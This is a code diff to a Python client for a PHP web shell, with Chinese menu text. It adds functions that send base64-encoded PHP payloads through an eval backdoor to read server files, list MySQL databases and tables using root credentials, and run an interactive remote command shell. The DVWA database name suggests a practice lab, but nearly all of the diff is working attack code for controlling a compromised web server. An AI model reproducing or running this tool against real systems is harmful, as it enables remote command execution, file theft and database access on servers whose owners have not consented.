@@ -165,13 +165,18 @@ def UploadFile():
 	post_data = shellpass + z0 + z1 + z2
 	response = oldpost(url,post_data)
 
-def DownloadFeile():
+def DownloadFile():
 	print (r'例如：c:\phpStudy\WWW\\')
 	# download_file_path = input(r'Please input path: ')
 	download_file_path = r'c:\phpStudy\WWW\\'
 	downloadfile = input('Please upload file: ')
 	shellpass = b'shellpass=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B'
-	z0 = b'&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pOiRfUE9TVFsiejEiXTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7'
+	z0 = b'&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTt\
+	Ac2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1nZXRfbWFnaWNfcXV\
+	vdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pOiRfUE9TVFsiejEiXTskZnA9QGZvc\
+	GVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHN\
+	le2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7'
+	
 	z1 = '{0}{1}'.format(download_file_path,downloadfile)
 	print (z1)
 	z1 = b'&z1=' + bytes(z1,encoding='utf8')
@@ -187,10 +192,86 @@ def DeleteFile():
 
 def ShowDB():
 
-	pass
+	shellpass = b'shellpass=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B'
+	z0 = b'&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTt\
+	Ac2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskbT1nZXRfbWFnaWNfcXV\
+	vdGVzX2dwYygpOyRoc3Q9JG0%2Fc3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSk6JF9QT1NUWyJ6MSJ\
+	dOyR1c3I9JG0%2Fc3RyaXBzbGFzaGVzKCRfUE9TVFsiejIiXSk6JF9QT1NUWyJ6MiJdOyRwd2Q9JG0\
+	%2Fc3RyaXBzbGFzaGVzKCRfUE9TVFsiejMiXSk6JF9QT1NUWyJ6MyJdOyRUPUBteXNxbF9jb25uZWN\
+	0KCRoc3QsJHVzciwkcHdkKTskcT1AbXlzcWxfcXVlcnkoIlNIT1cgREFUQUJBU0VTIik7d2hpbGUoJ\
+	HJzPUBteXNxbF9mZXRjaF9yb3coJHEpKXtlY2hvKHRyaW0oJHJzWzBdKS5jaHIoOSkpO31AbXlzcWx\
+	fY2xvc2UoJFQpOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D'
+	z1_3 = b'&z1=localhost&z2=root&z3=root'
+	
+	post_data = shellpass + z0 + z1_3
+
+	response = oldpost(url,post_data)
+	pattern = re.compile('\s?(\w+)\s+')
+	db_result = pattern.findall(response)
+	for db in db_result:
+		print (db)
+def ShowTable():
+
+	shellpass = b'shellpass=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B'
+	z0 = b'&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskbT1nZXRfbWFnaWNfcXVvdGVzX2dwYygpOyRoc3Q9JG0%2Fc3RyaXBzbGFzaGVzKCRfUE9TVFsiejEiXSk6JF9QT1NUWyJ6MSJdOyR1c3I9JG0%2Fc3RyaXBzbGFzaGVzKCRfUE9TVFsiejIiXSk6JF9QT1NUWyJ6MiJdOyRwd2Q9JG0%2Fc3RyaXBzbGFzaGVzKCRfUE9TVFsiejMiXSk6JF9QT1NUWyJ6MyJdOyRkYm49JG0%2Fc3RyaXBzbGFzaGVzKCRfUE9TVFsiejQiXSk6JF9QT1NUWyJ6NCJdOyRUPUBteXNxbF9jb25uZWN0KCRoc3QsJHVzciwkcHdkKTskcT1AbXlzcWxfcXVlcnkoIlNIT1cgVEFCTEVTIEZST00gYHskZGJufWAiKTt3aGlsZSgkcnM9QG15c3FsX2ZldGNoX3JvdygkcSkpe2VjaG8odHJpbSgkcnNbMF0pLmNocig5KSk7fUBteXNxbF9jbG9zZSgkVCk7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D'
+	z1_z4 = b'&z1=localhost&z2=root&z3=root&z4=dvwa'
+	post_data = shellpass + z0 + z1_z4
+
+	response = oldpost(url,post_data)
+	print (response)
+	pattern = re.compile('\s?(\w+)\s+')
+	db_result = pattern.findall(response)
+	for db in db_result:
+		print (db)
+
+def DosShell():
+	shellpass = b'shellpass=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B'
+	z0 = b'&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTt\
+	Ac2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2R\
+	lKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJ\
+	F9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcIns\
+	kc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJld\
+	Ck7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D'
+	z1 = b'&z1=Y21k'
+	current_path = GetCurrentPath()
+	print ('完整路径:{}'.format(current_path))
+	while True:
+		NowPath = current_path[:]
+		print ('你是谁:{0}'.format(NowPath))
+		NowPath = ''.join(NowPath).strip()
+		print ('新路径:{}'.format(NowPath))
+		cmd = input(NowPath + '>')
+		cmd = cmd.strip()
+
+		if cmd == 'q':break
+
+		cmd1 = 'cd /d "{0}"&{1}&echo [S]&cd&echo [E]'.format(NowPath+'\\',cmd)
+		print (cmd1)
+		# Python以后发送出去的数据必须是bytes的
+		cmd2 = base64.b64encode(bytes(cmd1, encoding='utf8'))
+
+		z2 = b'&z2=' + cmd2
+		print (z2)
+		post_data = shellpass + z0 + z1 + z2
+		response = oldpost(url,post_data)
+		# 匹配cd命令
+		pattern = re.compile('^cd')
+		result = pattern.findall(cmd)
+
+		if result:
+			data=RegexFindPath(r'C:(.*?)\n',response)
+
+			current_path= []
+			current_path.append(data)
+			current_path = ''.join(current_path)
+			print ('切换的路径: {}'.format(current_path[:]))
+		else:        
+			print (response)
+
+
 
 if __name__ == '__main__':
-	op = input('''Please select a number
+	op = input('''Please choice a number
 1: 虚拟终端
 2: 文件管理
 3: 数据库管理
@@ -198,8 +279,20 @@ if __name__ == '__main__':
 	if op == '1':
 		DoShell()
 	elif op == '2':
-		# UploadFile()
-		DownloadFeile()
-		# DeleteFile()
+		n = input('''Please choice a number
+1: DownloadFile
+2: UploadFile
+:''')
+		if n == '1':
+			DownloadFile()
+		elif n == '2':
+			UploadFile()
 	elif op == '3':
-		pass
+		n = input('''Please choice a number
+1: show dababases
+2: show tables
+:''')
+		if n == '1':
+			ShowDB()
+		elif n == '2':
+			ShowTable()
